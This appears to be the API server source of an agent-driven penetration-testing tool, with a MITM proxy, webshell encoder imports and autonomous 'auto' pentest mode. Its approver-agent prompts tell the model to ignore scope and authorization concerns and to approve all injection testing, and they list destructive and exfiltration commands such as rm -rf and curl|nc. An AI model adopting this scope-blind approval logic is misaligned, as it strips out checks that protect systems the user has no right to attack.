/**
 * HermesPentBox HTTP API + SSE 事件流
 * 传统接口层：Hermes 可直接 curl / HTTP 消费，不依赖 MCP
 *
 * GET  /api/status          引擎状态（代理端口/上游/统计）
 * GET  /api/flows?limit=&after=   流量列表（after=增量拉取）
 * GET  /api/flows/:id       单条流量
 * PUT  /api/upstream        设置上游代理 {type,host,port,username?,password?}
 * GET  /api/events          SSE 实时流量事件流
 * POST /api/proxy/stop      停代理
 * POST /api/proxy/restart   重启代理（换端口用 PUT /api/config）
 */
import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http'
import crypto from 'node:crypto'
import { spawn } from 'node:child_process'
import { existsSync, mkdirSync, readFileSync, writeFileSync, statSync, readdirSync } from 'node:fs'
import { writeFile } from 'node:fs/promises'
import { connect } from 'node:net'
import { SOUL_PERSONA, SOUL_ANALYZER, SOUL_APPROVER, USER_PROFILE } from './persona.ts'
import { homedir, tmpdir } from 'node:os'
import { basename, dirname, join } from 'node:path'
import v8 from 'node:v8'
import WebSocket from 'ws'
import { decodeBody } from './mitm.ts'
import { Neo4jGraph } from './graph.ts'
import os from 'node:os'
import type { Downstream, FlowMeta, ProxyEngine, Upstream } from './proxy.ts'
import type { ChromeBrowser } from './browser.ts'
import type { FirefoxBrowser } from './firefox.ts'
import type { SshSession } from './ssh.ts'
import { AgentBridgeClient } from './bridge.ts'
import { WebShellClient } from './webshell-client.ts'
import { normalizeTargetKey, resStatus, extractJson, STATIC_RESOURCE_RE, LOCAL_ARTIFACT_RE, BROWSER_TRAFFIC, isBrowserBuiltin, isPentboxOwnTraffic } from './utils.ts'
import { HAE_TAGS, HAE_GROUPS, HAE_CRED_TAGS, HAE_LEVEL_COLOR, haeTagList, type HaeGroup } from './tags.ts'
import { parseVulndoc } from './vulndoc.ts'
import zlib from 'node:zlib'
import { godzillaPhpEncode, godzillaPhpEncodeRaw, godzillaPhpDecode, godzillaPhpDecodeFull, godzillaSerializeParams, godzillaSerializeGzip, godzillaJspEncode, godzillaJspEncodeRaw, godzillaJspDecode, godzillaJspDecodeRaw, godzillaJspEncodeParams, godzillaCshapEncode, godzillaCshapEncodeRaw, godzillaCshapDecode, godzillaCshapDecodeRaw, behinderAesEncode, behinderAesDecode, behinderXorEncode, behinderXorDecode, antSwordPhpEncode, xorCrypt } from './webshell.ts'


/** 漏洞记录（Agent CRUD + UI 展示） */
export interface Vuln {
  id: number
  name: string
  level: 'high' | 'medium' | 'low' | 'info'
  cvss: string
  uri: string
  desc: string
  exploit: string
  status: 'pending' | 'confirmed' | 'false'
  reqRaw: string
  resRaw: string
  ts: number
}

export interface ApiDeps {
  chrome?: ChromeBrowser
  firefox?: FirefoxBrowser
  ssh?: SshSession
}

export interface ApiServerOptions {
  port: number
  host?: string
  proxyPort?: number   // 代理引擎实际端口（status 展示用）
  flowCap?: number     // 内存环形缓冲上限
}

const CORS = {
  'access-control-allow-origin': '*',
  'access-control-allow-methods': 'GET,PUT,POST,OPTIONS',
  'access-control-allow-headers': 'content-type',
}

/**
 * 思考深度映射（参考 hermes parse_reasoning_effort + deepseek build_api_kwargs_extras）：
 * none/false/disabled/off → {enabled:false}；low/medium/high 透传；xhigh/max/ultra → max；空/未知 → null（走默认）
 */
export function parseReasoningEffort(effort?: string): { enabled: boolean; effort?: string } | null {
  const e = String(effort ?? '').trim().toLowerCase()
  if (!e) return null
  if (['none', 'false', 'disabled', 'off', 'no'].includes(e)) return { enabled: false }
  const norm = ['xhigh', 'max', 'ultra'].includes(e) ? 'max' : e
  if (!['low', 'medium', 'high', 'max'].includes(norm)) return null
  return { enabled: true, effort: norm }
}

/** 全局情报条目（结构化：多 Agent 战况共享；持久条目不淘汰，滚动条目 20 条窗口） */
interface DigestEntry {
  kind: 'vuln' | 'cred' | 'nday' | 'penetrating' | 'penetrated' | 'cancelled' | 'note'
  host: string
  path: string
  data: string
  persist: boolean
  /** HaENet 分析标签（模块/组/等级/颜色，随条目写入 Neo4j 图节点） */
  tag?: string
  group?: HaeGroup
  level?: 'high' | 'medium' | 'low' | 'info'
  color?: string
}

export class ApiServer {
  private server?: Server
  /** 渗透审批模式：smart=Agent 审批渗透意见与渗透流量（自动意见卡 + 执行前审批）；manual=仅审计渗透流量，不自动发送意见卡（用户自主把关，规则硬拦截仍生效） */
  private approvalMode: 'smart' | 'manual' = 'smart'
  /** 渗透模式（三段式）：auto=全自动（Agent 负责全部渗透流程，意见卡自动渗透 + /pentest 全自动）；passive=被动（子 Agent 分析+意见卡，主 Agent 等用户沟通）；funnel=漏斗（子 Agent 纯流量审计不发意见卡，/pentest 全自动渗透+全局情报复合式渗透） */
  private pentestMode: 'auto' | 'passive' | 'funnel' = 'passive'
  /** 操作日志环形缓冲（终端日志面板：Agent 渗透/流量分析/WebShell 等关键操作；cap 2000 条） */
  private logBuf: { seq: number; ts: number; level: 'info' | 'ok' | 'warn' | 'err'; msg: string }[] = []
  private static readonly LOG_CAP = 2000
  private logSeq = 0
  /** 记录操作日志（缓冲 + SSE 实时推送 → 终端日志面板；seq 单调递增作增量游标） */
  private log(level: 'info' | 'ok' | 'warn' | 'err', msg: string): void {
    const entry = { seq: ++this.logSeq, ts: Date.now(), level, msg: String(msg).slice(0, 500) }
    this.logBuf.push(entry)
    if (this.logBuf.length > ApiServer.LOG_CAP) this.logBuf.splice(0, this.logBuf.length - ApiServer.LOG_CAP)
    this.pushSse({ type: 'log', ...entry })
  }
  private flows: FlowMeta[] = []
  private flowDetails = new Map<number, { reqHeaders: Record<string, string>; reqBody: string; resHeaders: Record<string, string>; resBody: string; reqRawHeaders: string[]; resRawHeaders: string[]; reqLine: string; resLine: string }>()
  private wsFlows: { ts: number; direction: 'sent' | 'received'; payload: string; length: number }[] = []
  private sseClients = new Set<ServerResponse>()
  private readonly cap: number
  private readonly port: number
  private readonly host: string
  private readonly opts: ApiServerOptions
  /** 并行分析子 Agent 槽位数（10 槽独立会话；声明在实例字段之前，供 analyzeSlots 等初始化引用） */
  private static readonly MAX_PARALLEL = 10

  constructor(
    private engine: ProxyEngine,
    private deps: ApiDeps = {},
    opts: ApiServerOptions,
  ) {
    this.opts = opts
    this.port = opts.port
    this.host = opts.host ?? '127.0.0.1'
    this.cap = opts.flowCap ?? 5000
    this.wsClient = new WebShellClient(this.engine)
  }

  async start(): Promise<void> {
    // Neo4j Agent 情报图（完全替代全局情报 digest）
    this.graph.connect()
    // 渗透审批模式（全局偏好，config.bin 持久化；默认智能）
    this.approvalMode = ApiServer.readConfig().approvalMode === 'manual' ? 'manual' : 'smart'
    // 渗透模式（三段式：全自动/被动/漏斗；全局偏好，config.bin 持久化；默认被动）
    const cfgMode = ApiServer.readConfig().pentestMode
    this.pentestMode = cfgMode === 'auto' || cfgMode === 'funnel' ? cfgMode : 'passive'
    this.probeHermes()
    setInterval(() => this.probeHermes(), 5000)  // HERMES AGENT 状态实时探测
    this.graph.setProject(this.projectKeyOf())  // Neo4j 图按项目域隔离（默认项目 → default）
    this.graph.migrateLegacyNodes().catch((e) => console.error('[pentbox] 旧图数据迁移失败:', String(e).slice(0, 120)))
    this.loadSession()  // 类 Burp 项目恢复：默认项目文件存在则自动加载上次会话（含流量/漏洞/WebShell/配置）
    this.sessionTimer = setInterval(() => this.queueSessionSave(), ApiServer.SESSION_AUTOSAVE_MS)  // Burp auto-save：定时异步快照
    void this.ensureHermesProfile()  // 自动确保 hermespentbox 独立档案（含 persona/用户画像；技能库在档案就绪后同步复制）
    void this.ensureAnalyzerProfile()  // 自动确保 hermespentbox-analyzer 审计员档案（流量分析子 Agent 专用）
    void this.ensureApproverProfile()  // 自动确保 hermespentbox-approver 审批官档案（渗透审批 Agent 专用）
    this.startAnalyzeLoop()
    this.server = createServer((req, res) => void this.handle(req, res))
    await new Promise<void>((resolve, reject) => {
      this.server!.once('error', reject)
      this.server!.listen(this.port, this.host, () => resolve())
    })
    // 引擎流量 → 内存缓冲 + SSE 广播
    this.engine.onFlow = (f) => this.push(f)
  }

  async stop(): Promise<void> {
    if (this.sessionTimer) clearInterval(this.sessionTimer)
    if (this.sessionFlushTimer) clearTimeout(this.sessionFlushTimer)
    this.saveSession()  // 退出兜底同步保存（保证落盘）
    for (const c of this.sseClients) c.end()
    this.sseClients.clear()
    await new Promise<void>((resolve) => this.server?.close(() => resolve()))
    this.server = undefined
  }

  push(f: FlowMeta): void {
    // MITM 全量报文分离存储（不进列表/SSE，按需取）
    if (f.detail) {
      this.flowDetails.set(f.id, f.detail)
      if (this.flowDetails.size > 200) {
        const first = this.flowDetails.keys().next().value as number
        this.flowDetails.delete(first)
      }
      const { detail, ...meta } = f
      this.flows.push(meta)
    } else {
      this.flows.push(f)
    }
    if (this.flows.length > this.cap) this.flows.splice(0, this.flows.length - this.cap)
    // 所有 HTTP/HTTPS 流量自动入 Agent 分析队列（消息队列：FIFO 逐个消费；带完整报文快照）
    // 跳过审计：应用自身流量（WebShell/Repeater，self 标记）|| 渗透窗口（子 Agent 渗透期间的流量，防循环）
    if (!f.self && !this.penetrating && f.method !== 'WS') {
      this.enqueueAnalyze(f.id, f.detail, f.url)
    } else if (f.method !== 'WS' && f.id) {
      // 跳过的流量：analyzeMap 标记 done + skipped（流量表 Agent 列显示跳过 ICON），不入分析队列
      this.analyzeMap.set(f.id, { state: 'done', vuln: false, skipped: true, self: !!f.self, penetrate: !!f.self && this.penetrating, detail: f.detail, url: f.url })
    }
    const { detail: _d, ...meta } = f
    this.pushSse(meta)
  }

  /** SSE 广播（try/catch 容错：客户端断开后 write 会抛异常，不能让它拖垮主流程） */
  private pushSse(obj: unknown): void {
    const payload = `data: ${JSON.stringify(obj)}\n\n`
    for (const c of this.sseClients) { try { c.write(payload) } catch { /* 客户端已断开 */ } }
  }

  pushWs(f: { ts: number; direction: 'sent' | 'received'; payload: string; length: number }): void {
    this.wsFlows.push(f)
    if (this.wsFlows.length > 500) this.wsFlows.splice(0, this.wsFlows.length - 500)
  }

  private repSeq = 0

  // ---------------- Agent 分析队列（流量逐个入队，外部 Agent 消费 /api/analyze/next 并写回结果） ----------------
  private analyzeQueue: number[] = []
  private analyzeMap = new Map<number, { state: 'queued' | 'analyzing' | 'done'; vuln?: boolean; level?: string; detail?: unknown; url?: string; sensitive?: { type: string; value: string; level?: string }[]; skipped?: boolean; builtin?: boolean; self?: boolean; penetrate?: boolean; confirmed?: boolean; confLevel?: string }>()
  /** 全局情报 digest：所有槽分析结论/凭据/渗透状态/取消记录结构化汇总（注入每次分析 prompt——子 Agent 共享上下文，防记忆割裂） */
  private analysisDigest: DigestEntry[] = []
  /** Neo4j Agent 情报图（会话内容共享，替代 digest） */
  private graph = new Neo4jGraph(process.env.NEO4J_URL || 'bolt://localhost:7687', process.env.NEO4J_USER || 'neo4j', process.env.NEO4J_PASS || 'pentbox123')
  /** 站点地图→图已同步的 URL 去重（防重复 MERGE 调用；Neo4j 侧幂等，此集仅控调用量） */
  private graphApiSynced = new Set<string>()
  /** 已推送意见卡的去重 key（无协议 Host+路径+查询 | 渗透方式）：同 URL 同方式不再重复推送；不同方式可再推（与"不同方式可再渗"一致） */
  private advisedKeys = new Set<string>()
  /** 已渗透成功的 URL+渗透方式（渗透成果去重：同 API 同方式不再重复渗透；不同方式可再渗） */
  private penetratedKeys = new Set<string>()
  /** 进行中的渗透 key（URL+渗透方式，统一 key 格式）：防同一 URL 同方式并发双渗透/双卡 */
  private penetratingKeys = new Set<string>()
  /** 进行中渗透的目标（slot → "Host+路径 方式"，供取消时写入全局情报） */
  private penetrateTargets = new Map<number, string>()
  /** 已提出渗透意见卡、等待用户决策的子 Agent 槽位（暂停该槽流量分析；用户点渗透/取消/卡片关闭后恢复；超时未决策自动恢复防全队停摆）→ slot: 发卡时间戳 */
  private pendingAdviceSlots = new Map<number, number>()
  /** 意见卡等待决策超时：用户长时间未决策（未点渗透/未取消/未关卡片）时自动恢复该槽流量分析，防 10 槽全部被卡片暂停导致分析停摆 */
  private static readonly ADVICE_TIMEOUT_MS = 5 * 60 * 1000
  /** 本地 hermes gateway 进程（渗透经 gateway 执行：取消走 WebSocket abort 信号，参考 hermes-studio chat-run 实现） */
  private gatewayProc: ReturnType<typeof spawn> | null = null

  // ---------------- Agent Bridge（主 Agent 对话 + 运行中引导 steer；参考 hermes-studio agent-bridge） ----------------
  /** 本应用专用 bridge 端口（独立于桌面 backend 的 18765，避免冲突） */
  private readonly bridgePort = 28766
  /** bridge broker 进程 */
  private bridgeProc: ReturnType<typeof spawn> | null = null
  /** bridge 就绪标记（TCP 可连 = 就绪） */
  private bridgeReady = false
  /** bridge 客户端 */
  private bridge = new AgentBridgeClient({ host: '127.0.0.1', port: this.bridgePort })

  /** 清理上次实例崩溃残留的 bridge 进程（按命令行匹配 pentbox_bridge 的 python，避免复用异常状态） */
  private killStaleBridge(): void {
    try {
      const { execSync } = require('node:child_process') as typeof import('node:child_process')
      execSync(`powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \\"Name='python.exe'\\" | Where-Object { $_.CommandLine -match 'pentbox_bridge' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"`, { timeout: 8000, stdio: 'ignore', windowsHide: true })
      console.warn('[pentbox] 已清理残留 Agent Bridge 进程')
    } catch (e) { console.warn('[pentbox] 残留 bridge 清理失败:', String(e).slice(0, 100)) }
  }

  /** spawn Agent Bridge broker 并登记到进程注册表（退出时统一清理） */
  private spawnBridge(): boolean {
    // 用 hermes-agent 的 venv python 启动本应用自带的 Agent Bridge（core/pentbox_bridge.py）
    const py = join(homedir(), 'AppData', 'Local', 'hermes', 'hermes-agent', 'venv', 'Scripts', 'python.exe')
    // 优先环境变量指定，否则用应用自带脚本（部署/开发目录）
    const candidates = [
      process.env.PENTBOX_BRIDGE_SCRIPT,
      join(process.cwd(), 'core', 'pentbox_bridge.py'),
      join(__dirname, '..', 'core', 'pentbox_bridge.py'),
    ]
    const found = candidates.find((p) => p && existsSync(p))
    if (!found) { console.warn('[pentbox] pentbox_bridge.py 未找到，steer/对话桥接不可用'); return false }
    console.log('[pentbox] 启动 Agent Bridge broker…', found)
    this.bridgeProc = spawn(py, [found, '--port', String(this.bridgePort), '--hermes-home', this.hermesHome], {
      env: { ...process.env, HERMES_HOME: this.hermesHome, PENTBOX_ANALYZER_HOME: this.analyzerHome, PENTBOX_APPROVER_HOME: this.approverHome, HERMES_AGENT_ROOT: join(homedir(), 'AppData', 'Local', 'hermes', 'hermes-agent'), PENTBOX_BRIDGE_LOG: join(process.cwd(), 'core', 'pentbox_bridge.log') }, cwd: this.agentCwd, detached: true, stdio: 'ignore', windowsHide: true,
    })
    this.bridgeProc.on('exit', () => { this.bridgeProc = null; this.bridgeReady = false })
    this.bridgeProc.unref()
    return true
  }

  /** 端口可达但非本实例 spawn → 视为上次崩溃残留：清理重建（保证 bridge 始终自管，杜绝复用异常状态） */
  private rebuildStaleBridge(): void {
    if (this.bridgeProc || this.bridgeReady) return
    console.warn('[pentbox] 检测到残留 Agent Bridge（非本实例 spawn），清理重建…')
    this.killStaleBridge()
    if (!this.spawnBridge()) return
    const t0 = Date.now()
    const iv = setInterval(() => {
      this.bridge.ping()
        .then(() => { clearInterval(iv); this.bridgeReady = true; console.log('[pentbox] Agent Bridge 重建就绪') })
        .catch(() => { if (Date.now() - t0 > 25000) { clearInterval(iv); console.warn('[pentbox] Agent Bridge 重建超时') } })
    }, 1000)
  }

  /** 确保本地 Agent Bridge broker 运行（本应用自带的 pentbox_bridge.py；TCP line-protocol，独立端口）
   * 启动时若端口被非本实例的残留 bridge 占用（上次崩溃遗留）→ 清理后重建，避免复用异常状态 */
  private ensureBridge(): Promise<void> {
    if (this.bridgeReady) return Promise.resolve()
    return new Promise((resolve) => {
      const waitReady = (t0: number) => {
        const iv = setInterval(() => {
          this.bridge.ping()
            .then(() => { clearInterval(iv); this.bridgeReady = true; resolve() })
            .catch(() => { if (Date.now() - t0 > 25000) { clearInterval(iv); console.warn('[pentbox] Agent Bridge 启动超时'); resolve() } })
        }, 1000)
      }
      const probe = () => {
        this.bridge.ping()
          .then(() => {
            if (this.bridgeProc) { this.bridgeReady = true; resolve(); return }  // 本实例 spawn 的，健康
            this.rebuildStaleBridge()  // 残留 bridge：清理重建
            resolve()
          })
          .catch(() => {
            if (!this.bridgeProc) this.spawnBridge()  // 未运行 → 启动
            waitReady(Date.now())
          })
      }
      probe()
    })
  }

  /** 确保本地 gateway 运行（127.0.0.1:8642 探测；未运行则 spawn hermes gateway run 后台） */
  private ensureGateway(): Promise<void> {
    const net = require('node:net') as typeof import('node:net')
    return new Promise((resolve) => {
      const probe = net.connect(8642, '127.0.0.1')
      probe.on('connect', () => { probe.destroy(); resolve() })
      probe.on('error', () => {
        probe.destroy()
        if (!this.gatewayProc) {
          this.gatewayProc = spawn(this.hermesCli, ['gateway', 'run'], { env: this.hermesEnv, cwd: this.agentCwd, detached: true, stdio: 'ignore', windowsHide: true })
          this.gatewayProc.on('exit', () => { this.gatewayProc = null })  // 进程退出即重置引用（下次渗透可重新拉起）
          this.gatewayProc.unref()
        }
        const t0 = Date.now()
        const iv = setInterval(() => {
          const p = net.connect(8642, '127.0.0.1')
          p.on('connect', () => { p.destroy(); clearInterval(iv); resolve() })
          p.on('error', () => { p.destroy(); if (Date.now() - t0 > 20000) { clearInterval(iv); resolve() } })
        }, 1000)
      })
    })
  }

  /** Agent 角色 → 档案映射（LLM 模型按角色独立管理：每个角色用自己档案的 config.yaml + .env） */
  private agentRoles(): { role: string; cn: string; profile: string; home: string; desc: string }[] {
    return [
      { role: 'executor', cn: '执行官', profile: 'hermespentbox', home: this.hermesHome, desc: '主 Agent 对话 / 渗透执行' },
      { role: 'analyzer', cn: '审计员', profile: 'hermespentbox-analyzer', home: this.analyzerHome, desc: '流量分析（10 槽并行）' },
      { role: 'approver', cn: '审批官', profile: 'hermespentbox-approver', home: this.approverHome, desc: '渗透审批' },
    ]
  }

  /** 读角色档案 config.yaml 的 model 段 + .env 的 <PROVIDER>_API_KEY（返回原始 key，展示层自行脱敏） */
  private readRoleModel(home: string): { default: string; provider: string; base_url: string; api_key: string } | null {
    try {
      const cfgPath = join(home, 'config.yaml')
      if (!existsSync(cfgPath)) return null
      const text = readFileSync(cfgPath, 'utf8')
      // 行解析 model 段（JS 正则无 \Z；档案 config 可能只有 model 段，段匹配会失败）
      const lines = text.split(/\r?\n/)
      let inModel = false
      const seg: string[] = []
      for (const l of lines) {
        if (/^model:/.test(l)) { inModel = true; continue }
        if (inModel && /^\S/.test(l)) break
        if (inModel) seg.push(l)
      }
      const get = (k: string) => {
        const line = seg.find((l) => l.trim().startsWith(`${k}:`))
        if (!line) return ''
        return line.split(':').slice(1).join(':').trim().replace(/^['"]|['"]$/g, '')
      }
      let apiKey = ''
      try {
        const envText = readFileSync(join(home, '.env'), 'utf8')
        const keyName = `${get('provider').toUpperCase().replace(/[^A-Z0-9]/g, '_')}_API_KEY`
        apiKey = envText.match(new RegExp(`^${keyName}=(.*)$`, 'm'))?.[1] ?? ''
      } catch { /* 无 .env */ }
      return { default: get('default'), provider: get('provider'), base_url: get('base_url'), api_key: apiKey, reasoning: get('reasoning') }
    } catch (e) {
      console.warn('[pentbox] 读取角色模型失败:', String(e).slice(0, 100))
      return null
    }
  }

  /** 应用模型到指定角色档案（hermes config set + .env 端点/key；HOME 覆盖到目标档案） */
  private async applyModelToRole(home: string, body: { model: string; provider?: string; baseUrl?: string; apiKey?: string; reasoning?: string }): Promise<void> {
    const provider = body.provider === 'minimax' ? 'minimax-cn' : body.provider  // Hermes 官方 provider 名（minimax-cn）
    const env = { ...this.hermesEnv, HERMES_HOME: home }  // config set 写到目标角色档案
    const cfg = (k: string, v: string) => new Promise<void>((resolve) => {
      const child = spawn(this.hermesCli, ['config', 'set', k, v], { env, cwd: this.agentCwd, windowsHide: true })
      child.on('close', () => resolve())
    })
    await cfg('model.default', body.model)
    if (provider) await cfg('model.provider', provider)
    if (body.reasoning) await cfg('model.reasoning', body.reasoning)
    if (body.baseUrl) {
      // 端点写 .env 的 OPENAI_BASE_URL（Hermes OpenAI 兼容约定；config.yaml 的 model.base_url 会与内置端点冲突）
      const envPath = join(home, '.env')
      let envText = existsSync(envPath) ? readFileSync(envPath, 'utf8') : ''
      const re = /^OPENAI_BASE_URL=.*$/m
      envText = re.test(envText) ? envText.replace(re, `OPENAI_BASE_URL=${body.baseUrl}`) : envText.trimEnd() + `\nOPENAI_BASE_URL=${body.baseUrl}\n`
      writeFileSync(envPath, envText)
    }
    if (body.apiKey && provider) {
      // 真实 key 写档案 .env（config set 对 key 值脱敏，必须走 <PROVIDER>_API_KEY 环境变量）
      const keyName = `${provider.toUpperCase().replace(/[^A-Z0-9]/g, '_')}_API_KEY`
      const envPath = join(home, '.env')
      let envText = existsSync(envPath) ? readFileSync(envPath, 'utf8') : ''
      const re = new RegExp(`^${keyName}=.*$`, 'm')
      envText = re.test(envText) ? envText.replace(re, `${keyName}=${body.apiKey}`) : envText.trimEnd() + `\n${keyName}=${body.apiKey}\n`
      writeFileSync(envPath, envText)
    }
    // 清理 config.yaml 的 api_key/base_url 残留（key 与端点都走 .env；config set 写入的 key 会被脱敏成假值导致 401）
    const cfgPath = join(home, 'config.yaml')
    if (existsSync(cfgPath)) {
      const text = readFileSync(cfgPath, 'utf8')
      const clean = text.split(/\r?\n/).filter((l) => !/^\s*(api_key|base_url):/.test(l)).join('\n')
      if (clean !== text) writeFileSync(cfgPath, clean)
    }
  }

  /** 工具调用级审批（纯 Agent）：Agent/外部发起的 WebShell 命令/文件操作前过审批官；
   * 用户手动操作（请求带 x-pentbox-user 标记头）免审直接执行 */
  private async approveCommand(tool: string, target: string, command: string): Promise<{ allowed: boolean; reason: string }> {
    try {
      const prompt = `你是渗透操作审批官。审批以下工具调用是否安全合规（只判断，不执行任何操作）：\n【工具】${tool}\n【目标】${target || '(未知)'}\n【命令/操作】${String(command || '').slice(0, 1000)}\n\n重要：目标由用户指定并负责授权——不要以目标为保留域名/知名机构/内网公网/未知来源/范围外等任何理由拒绝；你只判断命令本身是否破坏性/不可逆（删除文件 rm -rf、删库/清空数据、格式化、写裸设备、fork bomb、关机重启、勒索加密、数据外泄管道 curl|nc 外传等）。常规只读/运维命令（ls/cat/whoami/id/pwd/netstat/ps/ifconfig/echo 等）与常规渗透验证命令一律批准。\n只输出一行 JSON：{"allowed": true或false, "reason": "简要理由"}`
      const out = await this.bridgeAsk(prompt, null, {}, false, 'hermespentbox-approver')
      const j = extractJson(out)
      const allowed = j?.allowed === true || String(j?.allowed).toLowerCase() === 'true'
      const reason = String(j?.reason || '').slice(0, 200)
      this.log(allowed ? 'info' : 'warn', `[审批] ${allowed ? '✓ 批准' : '⛔ 拒绝'} ${tool} 命令: ${String(command || '').slice(0, 60)}${reason ? ' — ' + reason : ''}`)
      return { allowed, reason: reason || (allowed ? '审批通过' : '审批 Agent 判定为破坏性操作') }
    } catch (e) {
      this.log('err', `[审批] ${tool} 命令审批失败（保守拒绝）: ${String((e as Error).message).slice(0, 100)}`)
      return { allowed: false, reason: '审批 Agent 不可用，保守拒绝执行' }
    }
  }

  /** 渗透审批（纯 Agent 语义判断）：审批官档案（hermespentbox-approver）独立灵魂配置判断是否安全合规；失败保守拒绝（安全优先） */
  private async approvePenetration(targetKey: string, method: string, reqRaw: string, advice: string): Promise<{ allowed: boolean; reason: string }> {
    try {
      const prompt = `你是渗透操作审批官。审批以下渗透任务是否安全合规（只判断，不执行任何操作）：\n【目标】${targetKey || '(未知)'}\n【方式】${method || '(未知)'}\n【原始请求包】${(reqRaw || '').slice(0, 1500)}\n【任务描述】${(advice || '').slice(0, 500)}\n\n重要：目标由用户指定并负责授权——不要以目标为保留域名/知名机构/内网公网/未知来源/范围外等任何理由拒绝；你只判断操作本身是否破坏性/不可逆（删库/清空数据/删文件/格式化/勒索/数据外泄管道等）。只读验证与注入验证一律批准。\n只输出一行 JSON：{"allowed": true或false, "reason": "简要理由"}`
      const out = await this.bridgeAsk(prompt, null, {}, false, 'hermespentbox-approver')
      const j = extractJson(out)
      const allowed = j?.allowed === true || String(j?.allowed).toLowerCase() === 'true'
      const reason = String(j?.reason || '').slice(0, 200)
      this.log(allowed ? 'info' : 'warn', `[审批] ${allowed ? '✓ 批准' : '⛔ 拒绝'} ${targetKey} · ${method}${reason ? ' — ' + reason : ''}`)
      return { allowed, reason: reason || (allowed ? '审批通过' : '审批 Agent 判定为破坏性/越界操作') }
    } catch (e) {
      this.log('err', `[审批] Agent 审批失败（保守拒绝）: ${String((e as Error).message).slice(0, 100)}`)
      return { allowed: false, reason: '审批 Agent 不可用，保守拒绝执行（安全优先）' }
    }
  }

  /** 渗透经本地 Agent Bridge 执行（与主对话/分析同通道，会话可 steer；取消 = bridge interrupt） */
  private runViaGateway(input: string, sessionId: string | null, onChild?: (stop: () => void) => void): Promise<string> {
    return this.bridgeAsk(input, sessionId, {
      onAbort: (stop) => onChild?.(stop),
    })
  }

  /** 主 Agent 对话经本地 Agent Bridge 执行（参考 hermes-studio agent-bridge）：
   * action:chat 启动会话（session_id 持久，跨轮续传）→ get_output 轮询流式输出（delta 增量）
   * 运行中可调 action:steer 注入引导（不打断当前 turn）；onEvent 回调：delta 流式 / done 收尾 / error
   * onAbort 回调：供前端中断（interrupt 优雅停止，保留会话历史） */
  private chatViaGateway(input: string, sessionId: string | null, onEvent: (ev: { type: 'delta' | 'done' | 'error' | 'tool' | 'sid'; text?: string; reply?: string; error?: string; sessionId?: string; tool?: string; preview?: string; evType?: string }) => void, onAbort?: (stop: () => void) => void): Promise<string> {
    return this.bridgeAsk(input, sessionId, {
      onDelta: (t) => onEvent({ type: 'delta', text: t }),
      onSid: (sid) => onEvent({ type: 'sid', sessionId: sid }),
      onTool: (ev) => onEvent({ type: 'tool', evType: ev.type, tool: ev.tool, preview: ev.preview }),
      onDone: (sid, reply) => onEvent({ type: 'done', reply, sessionId: sid }),
      onError: (msg) => onEvent({ type: 'error', error: msg }),
      onAbort,
    }, true)
  }

  /** 通用 Agent Bridge 单轮对话（分析/渗透/沟通/主对话共用）：
   * 无会话则新建（persist）；有则续传。返回完整回复文本。
   * profile 决定会话使用的档案（'hermespentbox' 主档案 / 'hermespentbox-analyzer' 审计员档案——流量分析子 Agent 专用） */
  private bridgeAsk(input: string, sessionId: string | null, opts: { onDelta?: (t: string) => void; onDone?: (sid: string, reply: string) => void; onSid?: (sid: string) => void; onTool?: (ev: { type: string; tool: string; preview: string }) => void; onError?: (msg: string) => void; onAbort?: (stop: () => void) => void } = {}, mainChat = false, profile = 'hermespentbox'): Promise<string> {
    return new Promise((resolve, reject) => {
      this.ensureBridge().then(async () => {
        try {
          if (!this.bridgeReady) return reject(new Error('Agent Bridge 未就绪'))
          // 无会话 → 新建 bridge 会话（persist）
          // 仅主 Agent 聊天（mainChat）允许回写 chatSessionId——流量分析/渗透的会话不得污染主会话指针
          let sid = sessionId
          if (!sid) {
            sid = `${this.projectSessionPrefix()}-${Date.now()}`  // 会话 id 带项目标识（归属当前项目）
            if (mainChat) this.chatSessionId = sid
          }
          opts.onSid?.(sid)  // 尽早通知会话 id（前端运行中 steer 需要）
          const started = await this.bridge.chat(sid, input, profile)
          if (!started?.ok) return reject(new Error('bridge 对话启动失败'))
          // 会话已在运行（并发/串话）：等待当前 run 完成后自动续发（同 session 串行），避免丢失消息
          if (started.status === 'already_running') {
            // 轮询上一次 run 直到 done（上限 180s，防止上一 run 卡死导致本消息永久挂起）
            const prevRun = started.run_id
            const deadline = Date.now() + 180_000
            await new Promise<void>((res) => {
              const iv = setInterval(async () => {
                try {
                  const o = await this.bridge.getOutput(prevRun, 0, 0)
                  if (o.done || Date.now() > deadline) { clearInterval(iv); res() }
                } catch { clearInterval(iv); res() }
              }, 300)
            })
            return this.bridgeAsk(input, sid, opts, mainChat, profile)  // 递归：上一轮完成后重发本条（保持 profile/会话归属）
          }
          const runId = started.run_id
          let out = ''
          let finished = false
          let cursor = 0
          let eventCursor = 0
          let lastToolCount = 0
          // 整体超时兜底：模型 API 卡死/极慢（如 minimax IndexError+38s latency）时自动中断 run 并失败，
          // 避免分析槽/前端状态永久"分析中"（broker 端还有 240s watchdog 双保险）
          const timer = setTimeout(() => {
            if (!finished) {
              this.bridge.interrupt(sid, undefined, profile).catch((e) => console.warn('[pentbox] bridge 中断失败:', String(e).slice(0, 100)))
              finish(new Error(`Agent 响应超时（180s），已自动中断`))
            }
          }, 180_000)
          const finish = (err?: Error) => { if (finished) return; finished = true; clearTimeout(timer); err ? reject(err) : resolve(out) }
          opts.onAbort?.(() => { this.bridge.interrupt(sid, undefined, profile).catch((e) => console.warn('[pentbox] bridge 中断失败:', String(e).slice(0, 100))); setTimeout(finish, 1500) })
          // 轮询 get_output（100ms 间隔）直到 done；delta 增量 + 工具进度转发
          const pump = async () => {
            while (!finished) {
              let chunk
              try { chunk = await this.bridge.getOutput(runId, cursor, eventCursor) } catch (e) { finish(new Error(`bridge 输出轮询失败：${(e as Error).message}`)); return }
              if (!chunk?.ok) { finish(new Error('bridge get_output 失败')); return }
              cursor = chunk.cursor ?? cursor
              eventCursor = chunk.event_cursor ?? eventCursor
              // 工具进度事件（新到才转发）
              if (opts.onTool && Array.isArray(chunk.tool_events) && chunk.tool_events.length > lastToolCount) {
                for (const ev of chunk.tool_events.slice(lastToolCount)) opts.onTool(ev)
                lastToolCount = chunk.tool_events.length
              }
              if (chunk.delta) { out += chunk.delta; opts.onDelta?.(chunk.delta) }
              if (chunk.status === 'error' || chunk.error) { opts.onError?.(chunk.error || 'run error'); finish(new Error(chunk.error || 'run error')); return }
              if (chunk.done) {
                if (chunk.output) out = chunk.output
                opts.onDone?.(sid, out)
                finish()
